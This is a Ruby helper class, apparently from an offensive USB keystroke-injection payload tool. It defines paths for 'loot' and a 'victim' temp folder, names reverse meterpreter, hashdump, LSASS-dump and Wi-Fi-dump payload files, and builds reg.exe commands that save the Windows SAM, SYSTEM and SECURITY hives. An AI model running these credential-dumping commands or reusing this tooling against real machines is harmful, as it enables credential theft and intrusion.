#!/usr/bin/env ruby
#
class Files
  def file_root
    File.expand_path(File.dirname($PROGRAM_NAME))
  end

  def text_path
    unless Dir.exist?(file_root + '/text_files/')
      Dir.mkdir(file_root + '/text_files/')
    end
    file_root + '/text_files/'
  end

  def duck_encode_file
    file_root + '/duck_encoder/'
  end

  def language_dir
    duck_encode_file + '/resources/'
  end

  def loot_dir
    file_root + '/loot/'
  end

  def reverse_meterpreter_file
    'powershell_reverse_ducky.txt'
  end

  def fast_meterpreter_file
    'fast_meterpreter_ducky.txt'
  end

  def hash_dump_file
    'hashdump_tcp.txt'
  end

  def lsass_dump_file
    'lsassdump_tcp.txt'
  end

  def wifi_dump_file
    'wifidump_tcp.txt'
  end

  def wget_file
    'wget_powershell.txt'
  end

  def hex_to_bin_file
    'hex_to_bin.txt'
  end

  def reg_folder
    'c:\\windows\\temp\\reg\\'
  end

  def cert_dir
    file_root + '/certs/'
  end

  def save_sam
    "reg.exe save HKLM\\SAM #{reg_folder}sam"
  end

  def save_sys
    "reg.exe save HKLM\\SYSTEM #{reg_folder}sys"
  end

  def save_sec
    "reg.exe save HKLM\\SECURITY #{reg_folder}sec"
  end

  def victim_path
    'c:\\windows\\temp'
  end

  def temp_path
    'c:\\windows\\temp\\test.txt'
  end
end
